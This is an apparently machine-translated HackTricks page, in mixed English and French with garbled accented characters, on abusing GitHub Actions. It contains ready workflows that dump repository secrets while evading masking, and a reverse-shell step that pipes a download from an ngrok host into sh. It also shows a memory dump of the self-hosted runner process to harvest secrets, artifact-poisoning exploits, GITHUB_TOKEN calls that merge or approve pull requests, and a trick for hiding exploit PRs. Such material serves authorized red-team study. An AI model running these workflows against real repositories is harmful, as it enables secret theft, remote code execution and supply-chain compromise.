# Abusing Github Actions

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

In this page you will find:

* A **summary of all the impacts** of an attacker managing to access a Github Action
* Different ways to **get access to an action**:
* Having **permissions** to create the action
* Abusing **pull request** related triggers
* Abusing **other external access** techniques
* **Pivoting** from an already compromised repo
* Finally, a section about **post-exploitation techniques to abuse an action from inside** (cause the mentioned impacts)

## Impacts Summary

For an introduction about [**Github Actions check the basic information**](../basic-github-information.md#github-actions).

In case you can **execute arbitrary Github actions/inject code** in a **repository**, you could be able to:

* **Voler** les **secrets** de ce repo/organisation.
* If you can only inject, you can steal whatever is already present in the workflow.
* Abuse **repo privileges** to access other platforms such as AWS and GCP.
* **Ex√©cuter du code dans des workers personnalis√©s** (if custom workers are used) and try to pivot from there.
* **√âcraser** le **code** du d√©p√¥t.
* This depends on the privileges of the `GITHUB_TOKEN` (if any).
* **Compromettre** les **d√©ploiements** et d'autres **artifacts**.
* If the code is deploying or storing something you could modify that and obtain some further access.

## GITHUB\_TOKEN

This "**secret**" (coming from `${{ secrets.GITHUB_TOKEN }}` and `${{ github.token }}`) is given when the admin enables this option:

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

This token is the same one a **Github Application will use**, so it can access the same endpoints: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github should release a [**flow**](https://github.com/github/roadmap/issues/74) that **allows cross-repository** access within GitHub, so a repo can access other internal repos using the `GITHUB_TOKEN`.
{% endhint %}

You can see the possible **permissions** of this token in: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Note that the token **expires after the job has completed**.\
These tokens looks like this: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Some interesting things you can do with this token:

{% tabs %}
{% tab title="Merge PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="Approuver PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Cr√©er une PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Notez qu'√† plusieurs reprises, vous pourrez trouver **des jetons d'utilisateur github dans les environnements Github Actions ou dans les secrets**. Ces jetons peuvent vous donner plus de privil√®ges sur le d√©p√¥t et l'organisation.
{% endhint %}

<details>

<summary>Liste des secrets dans la sortie de Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Obtenir un shell invers√© avec des secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Il est possible de v√©rifier les permissions accord√©es √† un Github Token dans les d√©p√¥ts d'autres utilisateurs **en v√©rifiant les journaux** des actions :

<figure><img src="../../../.gitbook/assets/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Ex√©cution Autoris√©e

{% hint style="info" %}
Ce serait le moyen le plus simple de compromettre les actions Github, car ce cas suppose que vous avez acc√®s √† **cr√©er un nouveau d√©p√¥t dans l'organisation**, ou que vous avez **des privil√®ges d'√©criture sur un d√©p√¥t**.

Si vous √™tes dans ce sc√©nario, vous pouvez simplement consulter les [techniques de post-exploitation](./#post-exploitation-techniques-from-inside-an-action).
{% endhint %}

### Ex√©cution √† partir de la Cr√©ation de D√©p√¥t

Dans le cas o√π les membres d'une organisation peuvent **cr√©er de nouveaux d√©p√¥ts** et que vous pouvez ex√©cuter des actions github, vous pouvez **cr√©er un nouveau d√©p√¥t et voler les secrets d√©finis au niveau de l'organisation**.

### Ex√©cution √† partir d'une Nouvelle Branche

Si vous pouvez **cr√©er une nouvelle branche dans un d√©p√¥t qui contient d√©j√† une Action Github** configur√©e, vous pouvez **la modifier**, **t√©l√©charger** le contenu, puis **ex√©cuter cette action depuis la nouvelle branche**. De cette mani√®re, vous pouvez **exfiltrer les secrets au niveau du d√©p√¥t et de l'organisation** (mais vous devez savoir comment ils sont appel√©s).

Vous pouvez rendre l'action modifi√©e ex√©cutable **manuellement**, lorsqu'un **PR est cr√©√©** ou lorsque **du code est pouss√©** (selon le niveau de bruit que vous souhaitez faire) :
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Ex√©cution Fork√©e

{% hint style="info" %}
Il existe diff√©rents d√©clencheurs qui pourraient permettre √† un attaquant d'**ex√©cuter une action Github d'un autre d√©p√¥t**. Si ces actions d√©clenchables sont mal configur√©es, un attaquant pourrait √™tre en mesure de les compromettre.
{% endhint %}

### `pull_request`

Le d√©clencheur de workflow **`pull_request`** ex√©cutera le workflow chaque fois qu'une demande de tirage est re√ßue avec quelques exceptions : par d√©faut, si c'est la **premi√®re fois** que vous **collaborez**, un **mainteneur** devra **approuver** l'**ex√©cution** du workflow :

<figure><img src="../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Comme la **limitation par d√©faut** est pour les **contributeurs de premi√®re fois**, vous pourriez contribuer en **corrigeant un bug/typo valide** et ensuite envoyer **d'autres PRs pour abuser de vos nouveaux privil√®ges `pull_request`**.

**J'ai test√© cela et √ßa ne fonctionne pas** : ~~Une autre option serait de cr√©er un compte avec le nom de quelqu'un qui a contribu√© au projet et a supprim√© son compte.~~
{% endhint %}

De plus, par d√©faut, cela **emp√™che les permissions d'√©criture** et **l'acc√®s aux secrets** du d√©p√¥t cible comme mentionn√© dans les [**docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> √Ä l'exception de `GITHUB_TOKEN`, **les secrets ne sont pas transmis au runner** lorsqu'un workflow est d√©clench√© depuis un d√©p√¥t **fork√©**. Le **`GITHUB_TOKEN` a des permissions en lecture seule** dans les demandes de tirage **provenant de d√©p√¥ts fork√©s**.

Un attaquant pourrait modifier la d√©finition de l'action Github afin d'ex√©cuter des choses arbitraires et d'ajouter des actions arbitraires. Cependant, il ne pourra pas voler des secrets ou √©craser le d√©p√¥t en raison des limitations mentionn√©es.

{% hint style="danger" %}
**Oui, si l'attaquant change dans la PR l'action github qui sera d√©clench√©e, son action Github sera celle utilis√©e et non celle du d√©p√¥t d'origine !**
{% endhint %}

Comme l'attaquant contr√¥le √©galement le code ex√©cut√©, m√™me s'il n'y a pas de secrets ou de permissions d'√©criture sur le `GITHUB_TOKEN`, un attaquant pourrait par exemple **t√©l√©charger des artefacts malveillants**.

### **`pull_request_target`**

Le d√©clencheur de workflow **`pull_request_target`** a **des permissions d'√©criture** sur le d√©p√¥t cible et **acc√®s aux secrets** (et ne demande pas de permission).

Notez que le d√©clencheur de workflow **`pull_request_target`** **s'ex√©cute dans le contexte de base** et non dans celui donn√© par la PR (pour **ne pas ex√©cuter de code non fiable**). Pour plus d'infos sur `pull_request_target`, [**consultez les docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
De plus, pour plus d'infos sur cet usage dangereux sp√©cifique, consultez ce [**post de blog github**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Cela peut sembler parce que le **workflow ex√©cut√©** est celui d√©fini dans la **base** et **non dans la PR**, qu'il est **s√©curis√©** d'utiliser **`pull_request_target`**, mais il y a **quelques cas o√π ce n'est pas le cas**.

Et celui-ci aura **acc√®s aux secrets**.

### `workflow_run`

Le d√©clencheur [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) permet d'ex√©cuter un workflow √† partir d'un autre lorsqu'il est `compl√©t√©`, `demand√©` ou `en cours`.

Dans cet exemple, un workflow est configur√© pour s'ex√©cuter apr√®s que le workflow s√©par√© "Ex√©cuter des tests" soit termin√© :
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Moreover, according to the docs: Le workflow d√©marr√© par l'√©v√©nement `workflow_run` est capable d'**acc√©der aux secrets et d'√©crire des tokens, m√™me si le workflow pr√©c√©dent ne l'√©tait pas**.

Ce type de workflow pourrait √™tre attaqu√© s'il **d√©pend** d'un **workflow** qui peut √™tre **d√©clench√©** par un utilisateur externe via **`pull_request`** ou **`pull_request_target`**. Quelques exemples vuln√©rables peuvent √™tre [**trouv√©s dans ce blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Le premier consiste en un workflow d√©clench√© par **`workflow_run`** t√©l√©chargeant le code des attaquants : `${{ github.event.pull_request.head.sha }}`\
Le second consiste √† **passer** un **artifact** du code **non fiable** au workflow **`workflow_run`** et √† utiliser le contenu de cet artifact d'une mani√®re qui le rend **vuln√©rable √† RCE**.

### `workflow_call`

TODO

TODO : V√©rifiez si, lorsqu'il est ex√©cut√© √† partir d'un pull_request, le code utilis√©/t√©l√©charg√© est celui de l'origine ou de la PR fork√©e.

## Abus de l'ex√©cution fork√©e

Nous avons mentionn√© toutes les fa√ßons dont un attaquant externe pourrait r√©ussir √† faire ex√©cuter un workflow github, maintenant examinons comment ces ex√©cutions, si mal configur√©es, pourraient √™tre abus√©es :

### Ex√©cution de checkout non fiable

Dans le cas de **`pull_request`,** le workflow va √™tre ex√©cut√© dans le **contexte de la PR** (il ex√©cutera donc le **code malveillant de la PR**), mais quelqu'un doit **l'autoriser d'abord** et il s'ex√©cutera avec certaines [limitations](./#pull_request).

Dans le cas d'un workflow utilisant **`pull_request_target` ou `workflow_run`** qui d√©pend d'un workflow pouvant √™tre d√©clench√© √† partir de **`pull_request_target` ou `pull_request`**, le code du d√©p√¥t original sera ex√©cut√©, donc l'**attaquant ne peut pas contr√¥ler le code ex√©cut√©**.

{% hint style="danger" %}
Cependant, si l'**action** a un **checkout PR explicite** qui **r√©cup√©rera le code de la PR** (et non de la base), elle utilisera le code contr√¥l√© par les attaquants. Par exemple (voir la ligne 12 o√π le code de la PR est t√©l√©charg√©) :
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Fournie √† titre d'exemple uniquement.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Merci !
</code></pre>

Le code potentiellement **non fiable est ex√©cut√© pendant `npm install` ou `npm build`** car les scripts de construction et les **packages r√©f√©renc√©s sont contr√¥l√©s par l'auteur de la PR**.

{% hint style="warning" %}
Un dork github pour rechercher des actions vuln√©rables est : `event.pull_request pull_request_target extension:yml` cependant, il existe diff√©rentes fa√ßons de configurer les jobs pour √™tre ex√©cut√©s en toute s√©curit√© m√™me si l'action est configur√©e de mani√®re non s√©curis√©e (comme l'utilisation de conditionnelles sur qui est l'acteur g√©n√©rant la PR).
{% endhint %}

### Injections de scripts de contexte <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Notez qu'il existe certains [**contextes github**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) dont les valeurs sont **contr√¥l√©es** par l'**utilisateur** cr√©ant la PR. Si l'action github utilise ces **donn√©es pour ex√©cuter quoi que ce soit**, cela pourrait conduire √† une **ex√©cution de code arbitraire :**

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **Injection de script GITHUB_ENV** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

D'apr√®s la documentation : Vous pouvez rendre une **variable d'environnement disponible pour toutes les √©tapes suivantes** dans un job de workflow en d√©finissant ou en mettant √† jour la variable d'environnement et en l'√©crivant dans le fichier d'environnement **`GITHUB_ENV`**.

Si un attaquant pouvait **injecter n'importe quelle valeur** √† l'int√©rieur de cette variable **env**, il pourrait injecter des variables d'environnement qui pourraient ex√©cuter du code dans les √©tapes suivantes telles que **LD_PRELOAD** ou **NODE_OPTIONS**.

Par exemple ([**ceci**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) et [**ceci**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), imaginez un workflow qui fait confiance √† un artifact t√©l√©charg√© pour stocker son contenu √† l'int√©rieur de la variable d'environnement **`GITHUB_ENV`**. Un attaquant pourrait t√©l√©charger quelque chose comme ceci pour le compromettre :

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

### Actions Github tierces vuln√©rables

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Comme mentionn√© dans [**cet article de blog**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), cette action Github permet d'acc√©der √† des artifacts provenant de diff√©rents workflows et m√™me de d√©p√¥ts.

Le probl√®me est que si le param√®tre **`path`** n'est pas d√©fini, l'artifact est extrait dans le r√©pertoire actuel et peut √©craser des fichiers qui pourraient √™tre utilis√©s ou m√™me ex√©cut√©s plus tard dans le workflow. Par cons√©quent, si l'artifact est vuln√©rable, un attaquant pourrait en abuser pour compromettre d'autres workflows faisant confiance √† l'artifact.

Exemple de workflow vuln√©rable :
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Cela pourrait √™tre attaqu√© avec ce flux de travail :
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Autre Acc√®s Externe

### D√©tournement de Namespace de D√©p√¥t Supprim√©

Si un compte change de nom, un autre utilisateur pourrait enregistrer un compte avec ce nom apr√®s un certain temps. Si un d√©p√¥t avait **moins de 100 √©toiles avant le changement de nom**, Github permettra au nouvel utilisateur enregistr√© avec le m√™me nom de cr√©er un **d√©p√¥t avec le m√™me nom** que celui supprim√©.

{% hint style="danger" %}
Donc, si une action utilise un d√©p√¥t d'un compte inexistant, il est toujours possible qu'un attaquant puisse cr√©er ce compte et compromettre l'action.
{% endhint %}

Si d'autres d√©p√¥ts utilisaient **des d√©pendances de ces d√©p√¥ts utilisateurs**, un attaquant pourra les d√©tourner. Voici une explication plus compl√®te : [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Pivotement de D√©p√¥t

{% hint style="info" %}
Dans cette section, nous allons parler des techniques qui permettraient de **pivoter d'un d√©p√¥t √† un autre** en supposant que nous avons un certain type d'acc√®s au premier (voir la section pr√©c√©dente).
{% endhint %}

### Empoisonnement de Cache

Un cache est maintenu entre **les ex√©cutions de workflow dans la m√™me branche**. Ce qui signifie que si un attaquant **compromet** un **package** qui est ensuite stock√© dans le cache et **t√©l√©charg√©** et ex√©cut√© par un **workflow plus privil√©gi√©**, il pourra √©galement **compromettre** ce workflow.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Empoisonnement d'Artifact

Les workflows pourraient utiliser **des artifacts d'autres workflows et m√™me de d√©p√¥ts**, si un attaquant parvient √† **compromettre** l'Action Github qui **t√©l√©charge un artifact** qui est ensuite utilis√© par un autre workflow, il pourrait **compromettre les autres workflows** :

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Post Exploitation d'une Action

### Acc√©der √† AWS et GCP via OIDC

Consultez les pages suivantes :

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Acc√©der aux secrets <a href="#accessing-secrets" id="accessing-secrets"></a>

Si vous injectez du contenu dans un script, il est int√©ressant de savoir comment vous pouvez acc√©der aux secrets :

* Si le secret ou le token est d√©fini comme une **variable d'environnement**, il peut √™tre directement accessible via l'environnement en utilisant **`printenv`**.

<details>

<summary>Liste des secrets dans la sortie de l'Action Github</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Obtenir un shell invers√© avec des secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* Si le secret est utilis√© **directement dans une expression**, le script shell g√©n√©r√© est stock√© **sur disque** et est accessible.
* ```bash
cat /home/runner/work/_temp/*
```
* Pour des actions JavaScript, les secrets sont envoy√©s via des variables d'environnement.
* ```bash
ps axe | grep node
```
* Pour une **action personnalis√©e**, le risque peut varier en fonction de la mani√®re dont un programme utilise le secret qu'il a obtenu de l'**argument** :

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Abus de runners auto-h√©berg√©s

La fa√ßon de trouver quelles **Github Actions sont ex√©cut√©es dans une infrastructure non-Github** est de rechercher **`runs-on: self-hosted`** dans la configuration yaml de l'Action Github.

Les runners **auto-h√©berg√©s** peuvent avoir acc√®s √† des **informations extra sensibles**, √† d'autres **syst√®mes r√©seau** (points d'extr√©mit√© vuln√©rables dans le r√©seau ? service de m√©tadonn√©es ?) ou, m√™me s'il est isol√© et d√©truit, **plus d'une action peut √™tre ex√©cut√©e en m√™me temps** et la malveillante pourrait **voler les secrets** de l'autre.

Dans les runners auto-h√©berg√©s, il est √©galement possible d'obtenir les **secrets du processus \_Runner.Listener**\_\*\* qui contiendra tous les secrets des workflows √† n'importe quelle √©tape en vidant sa m√©moire :

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Consultez [**cet article pour plus d'informations**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Registre d'images Docker Github

Il est possible de cr√©er des actions Github qui **construiront et stockeront une image Docker √† l'int√©rieur de Github**.\
Un exemple peut √™tre trouv√© dans le suivant extensible :

<details>

<summary>Github Action Build &#x26; Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Comme vous pouvez le voir dans le code pr√©c√©dent, le registre Github est h√©berg√© sur **`ghcr.io`**.

Un utilisateur ayant des permissions de lecture sur le d√©p√¥t pourra alors t√©l√©charger l'image Docker en utilisant un jeton d'acc√®s personnel :
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Then, the user could search for **leaked secrets in the Docker image layers:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Informations sensibles dans les journaux des Github Actions

M√™me si **Github** essaie de **d√©tecter les valeurs secr√®tes** dans les journaux des actions et **d'√©viter de les afficher**, **d'autres donn√©es sensibles** qui pourraient avoir √©t√© g√©n√©r√©es lors de l'ex√©cution de l'action ne seront pas cach√©es. Par exemple, un JWT sign√© avec une valeur secr√®te ne sera pas cach√© √† moins qu'il ne soit [sp√©cifiquement configur√©](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Couvrir vos traces

(Technique de [**ici**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Tout d'abord, toute PR soumise est clairement visible au public sur Github et au compte GitHub cible. Sur GitHub, par d√©faut, nous **ne pouvons pas supprimer une PR d'internet**, mais il y a un twist. Pour les comptes Github qui sont **suspendus** par Github, toutes leurs **PRs sont automatiquement supprim√©es** et retir√©es d'internet. Donc, pour cacher votre activit√©, vous devez soit faire **suspendre votre compte GitHub, soit faire signaler votre compte**. Cela **cacherait toutes vos activit√©s** sur GitHub d'internet (en gros, retirer toutes vos PR d'exploitation)

Une organisation sur GitHub est tr√®s proactive dans le signalement des comptes √† GitHub. Tout ce que vous avez √† faire est de partager "certaines choses" dans un probl√®me et ils s'assureront que votre compte est suspendu dans les 12 heures :p et voil√†, vous avez rendu votre exploitation invisible sur github.

{% hint style="warning" %}
La seule fa√ßon pour une organisation de comprendre qu'elle a √©t√© cibl√©e est de v√©rifier les journaux GitHub depuis SIEM, car depuis l'interface utilisateur de GitHub, la PR serait supprim√©e.
{% endhint %}

## Outils

Les outils suivants sont utiles pour trouver des workflows Github Action et m√™me en trouver des vuln√©rables :

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* V√©rifiez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
